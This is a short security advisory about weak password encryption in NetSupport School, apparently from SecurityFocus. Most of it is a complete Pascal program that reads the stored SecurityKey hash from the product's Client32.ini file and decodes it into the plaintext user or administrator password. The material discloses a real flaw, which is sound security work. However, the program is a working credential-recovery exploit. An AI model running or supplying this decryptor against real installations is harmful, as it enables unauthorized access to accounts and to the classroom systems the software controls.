source: http://www.securityfocus.com/bid/9981/info

NetSupport School is prone to a password-encryption vulnerability because the application fails to protect passwords with a sufficiently effective encryption scheme. 

Exploiting this issue may allow an attacker to access user and administrator passwords for the affected application.

program name;
uses crt;
var i,j,length,x,y,crazy:integer;
    passfile:text;
    line:string;
    password,p:array [1..100] of char;
    known,convert:array [1..26,1..3] of char;
    ch,tempx,tempy,key:char;

procedure conv;
begin
convert[1,1]:='E';
convert[1,2]:='M';
convert[1,3]:='A';
for i:=2 to 26 do begin
    if convert[i-1,2]='P' then begin
       convert[i,1]:=chr(ord(convert[i-1,1])+1);
       convert[i,2]:='A';
    end
    else begin
         convert[i,1]:=convert[i-1,1];
         convert[i,2]:=chr(ord(convert[i-1,2])+1);
    end;
    convert[i,3]:=chr(ord(convert[i-1,3])+1);
end;
end;

procedure hex(a,b:char; num:integer);
begin
if num>0 then begin
for i:=1 to num do begin
    if b='P' then begin
       b:='A';
       a:=chr(ord(a)+1);
    end else inc(b);
end;
end;
if num<0 then begin
for i:=-1 downto num do begin
    if b='A' then begin
       b:='P';
       a:=chr(ord(a)-1);
    end else dec(b);
end;
end;
tempx:=a;
tempy:=b;
end;

function compare(a,b:char):char;
begin
for i:=1 to 26 do begin
if (a=convert[i,1])and(b=convert[i,2]) then compare:=chr(i+64);
end;
end;

function diff(a,b,c,d:char):integer;
var num1,num2,num3:integer;
begin
num1:=ord(a)*16+ord(b);
num2:=ord(c)*16+ord(d);
num2:=num2;
diff:=num2-num1;
end;


Begin
{get the hash from client32.ini}
clrscr;
Writeln(' _________________________________________________________');
Writeln('|NetSupport School Pro Password decryptor                 |');
Writeln('|Credits goto: Drexel University, Harry Hoffman, Mr. Flynn|');
Writeln('|and my wonderful fiance Halley                           |');
Writeln(' ---------------------------------------------------------');
Writeln('');
   assign (passfile,'C:\Progra~1\NetSup~1\Client32.ini');
   reset (passfile);
   i:=0;
   while not eof(passfile) do
   begin
        line:='';
        while not EoLn(passfile) do
        begin
             Read(passfile, ch);
             line:=line+ch;
             if line='SecurityKey=' then begin
                while not eoln(passfile) do
                begin
                  inc(i);
                  read(passfile,ch);
                  password[i]:=ch;
                end;
                length:=i;
             end;
        end;
        readln(passfile,line);
   end;
   write('Hash: ');
   for i:=1 to length do write(password[i]);
writeln('');
{decrypt the hash}
conv;
known[1,1]:='E';
known[1,2]:='M';
known[2,1]:='9';
known[2,2]:='O';
known[3,1]:='>';
known[3,2]:='A';
known[4,1]:='B';
known[4,2]:='C';
known[5,1]:='F';
known[5,2]:='E';
known[6,1]:=':';
known[6,2]:='G';
known[7,1]:='>';
known[7,2]:='I';
known[8,1]:='B';
known[8,2]:='K';
known[9,1]:='F';
known[9,2]:='M';
known[10,1]:=':';
known[10,2]:='O';
known[11,1]:='?';
known[11,2]:='A';
known[12,1]:='C';
known[12,2]:='C';
known[13,1]:='G';
known[13,2]:='E';
known[14,1]:=';';
known[14,2]:='G';
known[15,1]:='?';
known[15,2]:='I';
{get the first char}
for i:=1 to round(length/2) do p[i]:=chr(65);
for x:=1 to round(length/2) do begin
    crazy:=0;
    crazy:=-(round(length/2))+x;
    for y:=1 to round(length/2) do crazy:=crazy-(ord(p[y])-65);
    hex(password[x*2-1],password[x*2],crazy);
    p[x]:=chr(diff(known[x,1],known[x,2],tempx,tempy)+65);
end;
writeln('');
write('Password: ');
for i:=1 to round(length/2) do begin
    write(p[i]);
end;
readkey;

end.